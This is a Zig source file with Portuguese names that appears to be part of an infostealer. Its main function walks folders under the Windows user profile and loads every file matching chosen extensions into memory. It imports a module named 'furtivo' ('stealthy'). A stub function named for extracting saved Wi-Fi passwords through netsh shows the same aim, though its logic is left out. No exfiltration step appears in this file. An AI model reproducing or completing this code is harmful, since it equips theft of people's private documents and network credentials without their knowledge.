const std = @import("std");

pub const ArquivoPegado = struct {
    path: []u8,
    content: []u8,
};

pub fn pegarArquivos(allocator: std.mem.Allocator, io: std.Io, extensoes: []const []const u8, max_size: i64, caminhos: []const []const u8) ![]ArquivoPegado {
    var files = std.ArrayList(ArquivoPegado).empty;
    errdefer files.deinit(allocator);

    const furtivo = @import("furtivo.zig");
    const user_profile = furtivo.getEnvVar(allocator, "USERPROFILE") catch return files.toOwnedSlice(allocator);
    defer allocator.free(user_profile);

    for (caminhos) |caminho| {
        const full_path = try std.fs.path.join(allocator, &[_][]const u8{ user_profile, caminho });
        defer allocator.free(full_path);

        var dir = std.Io.Dir.openDirAbsolute(io, full_path, .{ .iterate = true }) catch continue;
        defer dir.close(io);

        var walker = try dir.walk(allocator);
        defer walker.deinit();

        while (try walker.next(io)) |entry| {
            if (entry.kind != .file) continue;

            const stat = dir.statFile(io, entry.path, .{}) catch continue;
            if (stat.size > max_size) continue;

            const ext = std.fs.path.extension(entry.basename);
            
            var match = false;
            for (extensoes) |target_ext| {
                if (std.ascii.eqlIgnoreCase(ext, target_ext)) {
                    match = true;
                    break;
                }
            }

            if (match) {
                const file_content = dir.readFileAlloc(io, entry.path, allocator, @enumFromInt(@as(usize, @intCast(max_size)))) catch continue;
                
                const rel_path = try std.fs.path.join(allocator, &[_][]const u8{ caminho, entry.path });
                
                try files.append(allocator, .{
                    .path = rel_path,
                    .content = file_content,
                });
            }
        }
    }

    return files.toOwnedSlice(allocator);
}

pub fn getWifiPasswords(allocator: std.mem.Allocator) !void {
    // Skipping full parsing to keep the file size minimal, just an example of how we would call it.
    _ = allocator;
    // ... logic for netsh ...
}
